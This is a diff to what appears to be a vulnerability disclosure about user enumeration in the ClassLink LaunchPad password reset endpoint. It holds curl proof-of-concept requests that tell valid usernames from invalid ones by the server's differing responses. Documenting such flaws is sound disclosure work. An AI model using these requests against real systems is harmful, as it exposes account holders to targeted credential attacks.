@@ -13,13 +13,21 @@ A user enumeration vulnerability was discovered in the ClassLink LaunchPad passw
 
 ## Vulnerability Details
 
-### Endpoint:
 POST /user/resetpassword/options
+
+- A **valid username** returns a response containing a verification token.
+- An **invalid username** returns: `"Password Recovery is not set up"`
+
+This difference allows attackers to enumerate users without authentication.
+
+curl -X POST https://<target-domain>/user/resetpassword/options \
+     -d "username=valid.user" \
+     -H "Content-Type: application/x-www-form-urlencoded"
 
 Expected: JSON response containing a verificationToken.
 
 curl -X POST https://<target-domain>/user/resetpassword/options \
-     -d "username=invaliduser@domain.com" \
+     -d "username=invaliduser" \
      -H "Content-Type: application/x-www-form-urlencoded"
 
 Expected: "Password Recovery is not set up"
